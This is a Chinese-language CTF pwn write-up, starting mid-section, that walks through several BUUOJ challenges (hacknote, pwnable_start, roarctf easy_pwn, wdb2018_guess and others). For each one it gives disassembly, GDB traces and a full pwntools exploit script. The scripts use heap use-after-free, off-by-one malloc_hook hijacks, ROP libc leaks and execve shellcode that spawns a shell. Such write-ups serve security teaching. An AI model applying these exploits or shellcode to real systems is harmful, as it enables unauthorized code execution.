<li>uaf，将<code>0x0804862b</code>改为一个我们能泄露的函数</li>
<li>计算<code>system</code>的相对位置</li>
<li>改<code>0x0804862b</code>为<code>system</code>，并传入<code>sh\x00\x00</code></li>
<li>调用原来的输出函数，输出的对象是刚才填入的<code>sh\x00\x00</code></li>
</ul>
<p>伪造过后</p>
<pre><code class="language-c">0x860b000:	0x00000000	0x00000011	0x0804862b	0x0860b030
0x860b010:	0x00000000	0x00000019	0x0860b038	0x61616161
0x860b020:	0x61616161	0x61616161	0x00000000	0x00000011
0x860b030:	0x0804862b	0x0804a018	0x00000000	0x00000019
0x860b040:	0x00000000	0x61616161	0x61616161	0x61616161
0x860b050:	0x00000000	0x00020fb1	0x00000000	0x00000000
</code></pre>
<h3>5.EXP</h3>
<pre><code class="language-python">from pwn import *
import struct
p = 0

def add(size, content):
    p.sendlineafter(&quot;Your choice :&quot;, &quot;1&quot;) 
    p.recvuntil(&quot;Note size :&quot;)
    p.sendline(str(size))
    p.recvuntil(&quot;Content :&quot;)
    p.sendline(content)

def delete(index):
    p.sendlineafter(&quot;Your choice :&quot;, &quot;2&quot;)
    p.recvuntil(&quot;Index :&quot;)
    p.sendline(str(index))
    

def show(index):
    p.sendlineafter(&quot;Your choice :&quot;, &quot;3&quot;)
    p.recvuntil(&quot;Index :&quot;)
    p.sendline(str(index))

def pwn(ip,port,mode,debug):
	elf = ELF(&quot;./hacknote&quot;)
	libc = ELF(&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;)
	global p
	if debug == 1:
		context.log_level = &quot;debug&quot;
	else:
		pass
	if mode == 0:
		p = process(&quot;./hacknote&quot;)
	else:
		p = remote(ip,port)

	add(0x10,'a'*0x10)    #note0
	add(0x10,'a'*0x10)    #note1

	delete(1)
	delete(0)

	fun_addr=0x0804862B
	add(8,p32(fun_addr)+p32(elf.got[&quot;free&quot;]))
	show(1)

	leak=u32(p.recv(4))
	libc_base = leak-libc.sym[&quot;free&quot;]
	sys_addr = libc_base+libc.sym[&quot;system&quot;]

	success('leak addr: '+hex(leak))
	success('libc base: '+hex(libc_base))
	success('system addr '+hex(sys_addr))

	delete(2)
	#add(8,p32(sys_addr)+';sh;')
	add(8,p32(sys_addr)+'||sh')
	show(1)

	p.interactive()

if __name__ == '__main__':
	pwn(&quot;node3.buuoj.cn&quot;,28478,1,0)
</code></pre>
<h2>pwnable_start</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<pre><code class="language-assembly">; =============== S U B R O U T I N E =======================================

                 public _start
 _start          proc near               ; DATA XREF: LOAD:08048018↑o
                 push    esp
                 push    offset _exit
                 xor     eax, eax
                 xor     ebx, ebx
                 xor     ecx, ecx
                 xor     edx, edx
                 push    ':FTC'
                 push    ' eht'
                 push    ' tra'
                 push    'ts s'
                 push    2774654Ch
                 mov     ecx, esp        ; addr
                 mov     dl, 20          ; len
                 mov     bl, 1           ; fd
                 mov     al, 4           ; syscall(write)
                 int     80h             ; LINUX - sys_write
                 xor     ebx, ebx        ; ebx清零
                 mov     dl, 60          ; len
                 mov     al, 3           ; syscall(read)
                 int     80h             ; LINUX -
                 add     esp, 14h
                 retn
.text:0804809C _start          endp ; sp-analysis failed
</code></pre>
<blockquote>
<p>1.向<code>addr</code>空间写入&quot;Let's start the CTF:&quot;;</p>
<p>2.调用<code>read</code>函数，这里有个栈溢出，溢出后返回<code>addr</code>；</p>
<p>3.返回后向<code>addr</code>写入<code>shellcode</code>；</p>
<p>4.最后<code>溢出</code>+<code>抬栈</code>+<code>shellcode</code>。</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = process('./start')
p = remote(&quot;node3.buuoj.cn&quot;,27809)
payload = 'a'*20 + p32(0x08048087)
p.recvuntil(':')
p.send(payload)
print(payload)
leak=u32(p.recv(4));
print(leak)
shellcode= '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload= 'a'*20 + p32(leak+20)+shellcode
p.send(payload)
p.interactive()
</code></pre>
<h2>pwnable_orw</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf(&quot;Give my your shellcode:&quot;);
  read(0, &amp;shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
</code></pre>
<blockquote>
<p>直接传入<code>shellcode</code>过后，执行<code>shellcode</code></p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26098)

shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)
shellcode = asm(shellcode)
p.recvuntil(&quot;Give my your shellcode:&quot;)
p.sendline(shellcode)
p.interactive()
</code></pre>
<h2>roarctf_2019_easy_pwn</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<p>四个功能：增删查改</p>
<pre><code class="language-python">def add(size):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(str(size))

def edit(index,size,data):   
    p.sendlineafter(&quot;: &quot;,'2') 
    p.sendlineafter(&quot;: &quot;,str(index))
    p.sendlineafter(&quot;: &quot;,str(size))
    p.recvuntil('content:')
    p.send(data)

def free(index):   
    p.sendlineafter(&quot;: &quot;,'3')
    p.recvuntil('index:')
    p.sendline(str(index))

def show(index):   
    p.sendlineafter(&quot;: &quot;,'4') 
    p.sendlineafter(&quot;: &quot;,str(index))
</code></pre>
<p><strong>edit</strong></p>
<pre><code class="language-c">  if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 15 )
  {
    v2 = *((_DWORD *)&amp;unk_202040 + 4 * v2);
    if ( v2 == 1 )
    {
      printf(&quot;size: &quot;);
      v2 = read_input(1);
      v4 = vuln(*((_DWORD *)&amp;unk_202044 + 4 * v3), v2);// off by one
      if ( v2 &gt; 0 )
      {
        printf(&quot;content: &quot;, (unsigned int)v2);
        v2 = sub_D92(qword_202048[2 * v3], v4);
      }
    }
  }
</code></pre>
<blockquote>
<p><code>off by one</code>漏洞,导致我们个已覆盖下一个堆块的<code>size</code>域，从而实现<code>chunk overlapping</code></p>
</blockquote>
<h3>3.GDB</h3>
<pre><code>#code
	add(0x18)#0
	add(0x18)#1
	add(0x88)#2
	add(0x88)#3

	add(0x28)#4
	add(0x28)#5
	add(0x68)#6

	edit(0,0x18+10,'a'*0x18+'\xb1')#off by one
	#1.szie=0x18 2.size=0x98
	#1.size+2.size=chunk_add.size=0xb0
	#	0x10+8 like this is more conviente to use
	#	not to add sth like p64(0)
	gdb.attach(p)

#GDB
pwndbg&gt; x/32gx 0x55a813ab9000
0x55a813ab9000:	0x0000000000000000	0x0000000000000021
0x55a813ab9010:	0x6161616161616161	0x6161616161616161
0x55a813ab9020:	0x6161616161616161	0x00000000000000b1
									这里已经被修改为'\xb1'
0x55a813ab9030:	0x0000000000000000	0x0000000000000000
0x55a813ab9040:	0x0000000000000000	0x0000000000000091
0x55a813ab9050:	0x0000000000000000	0x0000000000000000
0x55a813ab9060:	0x0000000000000000	0x0000000000000000
&gt;这样我们free(1)，就会得到`libc base`了
</code></pre>
<pre><code>#code
	free(1)
	add(0xa8)#1
	#gdb.attach(p)
	edit(1,0x20,'a'*0x18+p64(0x91))#repair
	#gdb.attach(p)
	free(2)
	show(1)    #leak
	gdb.attach(p)
#GDB
pwndbg&gt; bin
fastbins
.........
unsortedbin
all: 0x55d9d3909040 —▸ 0x7ff8d0bbab78 (main_arena+88) ◂— 0x55d9d3909040
..........
pwndbg&gt; x/32gx 0x55d9d3909000
0x55d9d3909000:	0x0000000000000000	0x0000000000000021
0x55d9d3909010:	0x6161616161616161	0x6161616161616161
0x55d9d3909020:	0x6161616161616161	0x00000000000000b1
0x55d9d3909030:	0x6161616161616161	0x6161616161616161
0x55d9d3909040:	0x6161616161616161	0x0000000000000091
0x55d9d3909050:	0x00007ff8d0bbab78	0x00007ff8d0bbab78
0x55d9d3909060:	0x0000000000000000	0x0000000000000000
0x55d9d3909070:	0x0000000000000000	0x0000000000000000
&gt;再输出chunk1的内容就可以输出`0x00007ff8d0bbab78`,从而泄露`libc base`
最后输出
[+] libc base=&gt;0x7ff8d07f6000
[+] malloc hook=&gt;0x7ff8d0bbab10
[+] realloc hook=&gt;0x7ff8d087a6c0
[+] one gadget=&gt;0x7ff8d083b26a
</code></pre>
<pre><code>这里我们用的one_gadget是
0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
所以需要满足条件[rsp+0x30] == NULL,这就需要realloc来对栈上的东西进行微调
#code
	edit(4,0x32,'a'*0x28+'\xa1') #off by one
	#gdb.attach(p)
	free(5)
	free(6)
	add(0x98)#2
	edit(2,0x38,'a'*0x28+p64(0x71)+p64(malloc_hook-0x23))
	#new 2 take the 5's place and hijack 6 to malloc hook
	#gdb.attach(p)
	add(0x68)#5
	add(0x68)#6 in malloc hook
	edit(6,27,'a'*(0x13-8)+p64(one_gadget)+p64(realloc))
	gdb.attach(p)

&gt;修改realloc_hook为onegadget，修改malloc_hook为realloc+偏移地址
#GDB
&gt;断点过后走几个单步
pwndbg&gt; x/16gx $rsp+0x30
0x7ffeb950d680:	0x0000000000000000	0x00007f5695fa773b
0x7ffeb950d690:	0x00007ffeb950d8db	0x00007f56961d99a0
0x7ffeb950d6a0:	0x0000000000000000	0x0000000000000000
0x7ffeb950d6b0:	0x0000000000000000	0x00007f5695fa773b
0x7ffeb950d6c0:	0x0000000000000000	0x00007ffeb950dd58
0x7ffeb950d6d0:	0x0000000000000000	0x0000000000000000
0x7ffeb950d6e0:	0x0000000000000000	0x00007ffeb950d8f0
0x7ffeb950d6f0:	0x0000000000000064	0x0000004000000000
&gt; 调用了过后就达成了
</code></pre>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./roarctf_2019_easy_pwn&quot;)
libc=ELF('/home/joe1sn/libc/64/libc-2.23.so')
p = process(&quot;./roarctf_2019_easy_pwn&quot;)

def add(size):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(str(size))

def edit(index,size,data):   
    p.sendlineafter(&quot;: &quot;,'2') 
    p.sendlineafter(&quot;: &quot;,str(index))
    p.sendlineafter(&quot;: &quot;,str(size))
    p.recvuntil('content:')
    p.send(data)

def free(index):   
    p.sendlineafter(&quot;: &quot;,'3')
    p.recvuntil('index:')
    p.sendline(str(index))

def show(index):   
    p.sendlineafter(&quot;: &quot;,'4') 
    p.sendlineafter(&quot;: &quot;,str(index))   

if __name__ == '__main__':
	add(0x18)#0
	add(0x18)#1
	add(0x88)#2
	add(0x88)#3

	add(0x28)#4
	add(0x28)#5
	add(0x68)#6

	edit(0,0x18+10,'a'*0x18+'\xb1')#off by one
	#1.szie=0x18 2.size=0x98
	#1.size+2.size=chunk_add.size=0xb0
	#	0x10+8 like this is more conviente to use
	#	not to add sth like p64(0)
	#gdb.attach(p)
	free(1)
	add(0xa8)#1
	#gdb.attach(p)
	edit(1,0x20,'a'*0x18+p64(0x91))#repair
	#gdb.attach(p)
	free(2)
	show(1)    #leak
	#gdb.attach(p)
	p.recvuntil('content: ')
	libc_base=u64(p.recvuntil(&quot;\x7f\x00\x00&quot;)[-8:])-0x3c4b78
	print(hex(libc_base))
	malloc_hook=libc_base+libc.sym['__malloc_hook']
	realloc = libc_base + libc.symbols['__libc_realloc']
	one_gadget=libc_base+0x4526a
	log.success(&quot;libc base=&gt;0x%x&quot;,libc_base)
	log.success(&quot;malloc hook=&gt;0x%x&quot;,malloc_hook)
	log.success(&quot;realloc hook=&gt;0x%x&quot;,realloc)
	log.success(&quot;one gadget=&gt;0x%x&quot;,one_gadget)
	'''
	add(0x28)#4
	add(0x28)#5
	add(0x68)#6
	'''

	edit(4,0x32,'a'*0x28+'\xa1') #off by one
	#gdb.attach(p)
	free(5)
	free(6)
	add(0x98)#2
	edit(2,0x38,'a'*0x28+p64(0x71)+p64(malloc_hook-0x23))
	#new 2 take the 5's place and hijack 6 to malloc hook
	#gdb.attach(p)
	add(0x68)#5
	add(0x68)#6 in malloc hook
	edit(6,27,'a'*(0x13-8)+p64(one_gadget)+p64(realloc))
	gdb.attach(p)
	add(0x10)
	p.interactive()
</code></pre>
<h2>rip</h2>
<h3>1.checksec</h3>
<pre><code class="language-bash">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+1h] [rbp-Fh]

  puts(&quot;please input&quot;);
  gets(&amp;s, argv);
  puts(&amp;s);
  puts(&quot;ok,bye!!!&quot;);
  return 0;
}
</code></pre>
<p> <strong>string</strong></p>
<pre><code class="language-bash">LOAD:00000000004002A8	0000001C	C	/lib64/ld-linux-x86-64.so.2
LOAD:00000000004003B9	0000000A	C	libc.so.6
LOAD:00000000004003C3	00000005	C	gets
LOAD:00000000004003C8	00000005	C	puts
LOAD:00000000004003CD	00000007	C	system
LOAD:00000000004003D4	00000012	C	__libc_start_main
LOAD:00000000004003E6	0000000C	C	GLIBC_2.2.5
LOAD:00000000004003F2	0000000F	C	__gmon_start__
.rodata:0000000000402004	0000000D	C	please input
.rodata:0000000000402011	0000000A	C	ok,bye!!!
.rodata:000000000040201B	00000008	C	/bin/sh
.eh_frame:00000000004020DF	00000006	C	;*3$\&quot;
</code></pre>
<blockquote>
<p>gets函数漏洞，有/bin/sh</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,27035)
binsh_addr = 0x401186
payload = '\x00'*0xf + p64(binsh_addr)
p.sendline(payload)
p.interactive()
</code></pre>
<h2>warmup_csaw_2016</h2>
<h3>1.checksec</h3>
<pre><code class="language-bash">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s; // [rsp+0h] [rbp-80h]
  char v5; // [rsp+40h] [rbp-40h]

  write(1, &quot;-Warm Up-\n&quot;, 0xAuLL);
  write(1, &quot;WOW:&quot;, 4uLL);
  sprintf(&amp;s, &quot;%p\n&quot;, sub_40060D);
  write(1, &amp;s, 9uLL);
  write(1, &quot;&gt;&quot;, 1uLL);
  return gets(&amp;v5, &quot;&gt;&quot;);
}
</code></pre>
<p>  <strong>string</strong></p>
<pre><code class="language-bash">LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2
LOAD:0000000000400361	0000000A	C	libc.so.6
LOAD:000000000040036B	00000005	C	gets
LOAD:0000000000400370	00000008	C	sprintf
LOAD:0000000000400378	00000007	C	system
LOAD:000000000040037F	00000012	C	__libc_start_main
LOAD:0000000000400391	00000006	C	write
LOAD:0000000000400397	0000000F	C	__gmon_start__
LOAD:00000000004003A6	0000000C	C	GLIBC_2.2.5
.rodata:0000000000400734	0000000D	C	cat flag.txt
.rodata:0000000000400741	0000000B	C	-Warm Up-\n
.rodata:000000000040074C	00000005	C	WOW:
.eh_frame:00000000004007FF	00000006	C	;*3$\&quot;
</code></pre>
<blockquote>
<p>gets溢出，system函数和cat flag字符串</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = 'debug'
p = remote(&quot;node3.buuoj.cn&quot;,28792)

cat_flag = 0x40060d

payload = '\x00'*(0x40+8) + p64(cat_flag)
p.sendlineafter(&quot;&gt;&quot;,payload)
print p.recv()
p.interactive()
</code></pre>
<h2>wdb2018_guess</h2>
<p>一道思路清奇的题</p>
<h3>checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>反汇编</h3>
<p><img src="https://s1.ax1x.com/2020/09/10/wJT5o6.png" alt="IDA.png" /></p>
<p>可以看出</p>
<ul>
<li>**1.**flag文件被读取到了栈上面</li>
<li>**2.**主程序创建(<code>fork</code>)了三个线程</li>
<li>**3.**在这个线程里面，程序将我们的输入和站上面的flag进行比较</li>
<li>**4.**我们输入的时候调用了<code>gets</code>，导致栈溢出</li>
</ul>
<h3>GDB调试</h3>
<ul>
<li><strong>1.</strong> 输入后，在<code>strcmp</code>断点</li>
</ul>
<p><img src="https://s1.ax1x.com/2020/09/13/wwH30U.png" alt="gdb-1.png" /></p>
<p>我们溢出0x128就可以覆盖 _libc_arg[0] 的值，从而泄露数据</p>
<ul>
<li>
<p><strong>2.</strong> 找到flag的内存位置</p>
<p>这个我们可以从环境变量入手，找到_libc_environ，然后再根据相对偏移找到flag在栈上的地址</p>
</li>
</ul>
<h3>知识点</h3>
<p>程序开启了canary保护，这里有个之前我忽略的点 <strong>canary的检查报错</strong></p>
<p>源码如下</p>
<pre><code class="language-cpp">void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail (&quot;stack smashing detected&quot;);
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) 
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
}
</code></pre>
<p>程序输出的时候使用了 <strong>__libc_argv[0]</strong> 来打印程序的名称，所以就可以从这里泄露一些信息</p>
<p>这里拓展一下</p>
<p><strong>argc</strong>：命令的条数</p>
<p><strong>argv[]</strong>：输入的每条命令</p>
<pre><code class="language-cpp">#include &lt;iostream&gt;
using std::cout;
using std::cin;
using std::endl;

int main(int argc, char *argv[])
{
	for (int i = 0; i &lt; argc; ++i)
		cout&lt;&lt;argv[i]&lt;&lt;endl;
	return 0;
}
</code></pre>
<p>输出</p>
<p><img src="https://s1.ax1x.com/2020/09/13/wwL7ND.png" alt="arg-1.png" /></p>
<p>那么argv[0]=程序的名称(也是第0条指令)</p>
<p><strong>_libc_environ</strong></p>
<p>在libc中保存了一个函数叫_environ，存的是当前进程的环境变量</p>
<p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261">如何从libc地址得到栈地址</a>这里面就详细写了这个函数</p>
<p><img src="https://s1.ax1x.com/2020/09/13/wwXps1.png" alt="arg-2.png" /></p>
<p><strong>攻击步骤</strong></p>
<ul>
<li><strong>1.</strong> 泄露libc</li>
<li><strong>2.</strong> 泄露_libc_arg的表头 environ，从而找到flag在站上面的地址</li>
<li><strong>3.</strong> 覆盖 **libc_arg[0]**为flag在栈上面的地址，最后通过 stack_smashing 泄露出flag</li>
</ul>
<h3>EXP</h3>
<pre><code class="language-python">from pwn import *
name = &quot;guess&quot;
elf = ELF(name)
# libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
libc = ELF(&quot;libc-2.23.so&quot;)
sh = 0

def main(ip,port,debug,mode):
	global sh
	if debug==0:
		context.log_level = &quot;debug&quot;
	else:
		pass
	if mode==0:
		sh = process(name)
	else:
		sh = remote(ip,port)

	payload = &quot;A&quot;*0x128
	payload += p64(elf.got[&quot;read&quot;])
	sh.sendlineafter(&quot;Please type your guessing flag\n&quot;,payload)
	
	sh.recvuntil('stack smashing detected ***: ')
	libc_base = u64(sh.recv(6).ljust(8,'\x00'))-libc.sym[&quot;read&quot;]
	system = libc_base + libc.sym[&quot;system&quot;]
	environ = libc_base+libc.sym['__environ']
	info(&quot;libc base -&gt; &quot;+hex(libc_base))
	info(&quot;libc_system -&gt; &quot;+hex(system))
	info(&quot;__libc_environ -&gt; &quot;+hex(environ))

	payload = &quot;A&quot;*0x128
	payload += p64(environ)
	sh.sendlineafter(&quot;Please type your guessing flag\n&quot;,payload)
	en_list = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,'\x00'))
	info(&quot;environ -&gt; &quot;+hex(en_list))

	payload=&quot;A&quot;*0x128
	payload += p64(en_list-0x168)
	sh.sendlineafter(&quot;Please type your guessing flag\n&quot;,payload)
	sh.recvuntil(&quot;*** stack smashing detected ***: &quot;)
	print sh.recvline()

if __name__ == '__main__':
	main(&quot;node3.buuoj.cn&quot;,&quot;26263&quot;,1,1)
</code></pre>
<h2>xdctf2015_pwn200</h2>
<h3>EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./bof&quot;)
#p = process(&quot;./bof&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,27377)

write_got = elf.got[&quot;write&quot;]
write_plt = elf.plt[&quot;write&quot;]
main = elf.sym[&quot;main&quot;]

payload = 'a'*(0x6c+4)
payload += p32(write_plt)+p32(main)
payload += p32(1)+p32(write_got)+p32(4)

p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)
p.sendline(payload)

leak_addr = u32(p.recvuntil('\xf7')[-4:])
libc = LibcSearcher(&quot;write&quot;,leak_addr)
base = leak_addr-libc.dump(&quot;write&quot;)
sys_addr = base+libc.dump(&quot;system&quot;)
binsh = base+libc.dump(&quot;str_bin_sh&quot;)

log.success(&quot;libc base=&gt;%x&quot;,base)
log.success(&quot;system addr=&gt;%x&quot;,sys_addr)
log.success(&quot;binsh=&gt;%x&quot;,binsh)

p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)
payload = 'a'*(0x6c+4)
payload += p32(sys_addr)+p32(main)
payload += p32(binsh)
p.sendline(payload)

p.interactive()
</code></pre>
<h2>铁人三项(第五赛区)_2018_rop</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>vulnerable_function</strong></p>
<pre><code class="language-c">ssize_t vulnerable_function()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &amp;buf, 0x100u);
}
</code></pre>
<blockquote>
<p>溢出+libc leak</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26402)
elf = ELF(&quot;./2018_rop&quot;)
libc = ELF(&quot;./libc-2.27.so&quot;)

read_plt = elf.plt[&quot;read&quot;]
read_got = elf.got[&quot;read&quot;]
write_plt = elf.plt[&quot;write&quot;]
write_got = elf.got[&quot;write&quot;]
main_addr = elf.sym[&quot;main&quot;]

payload = &quot;a&quot;*(0x88+4)
payload += p32(write_plt)+p32(main_addr)
payload +=  p32(1)+p32(write_got)+p32(4)

p.sendline(payload)
leak_addr = u32(p.recv(4))
libc_base = leak_addr - libc.sym[&quot;write&quot;]
sys_addr = libc_base + libc.sym[&quot;system&quot;]
binsh = libc_base + libc.search('/bin/sh').next()
log.info(&quot;libc base=&gt;%x&quot;,libc_base)
log.info(&quot;system addr=&gt;%x&quot;,sys_addr)
log.info(&quot;/bin/sh addr=&gt;%x&quot;,binsh)


payload = 'a'*(0x88+4)
payload += p32(sys_addr)+p32(main_addr)
payload += p32(binsh)
p.sendline(payload)

p.interactive()
</code></pre>

</div>
</div></body>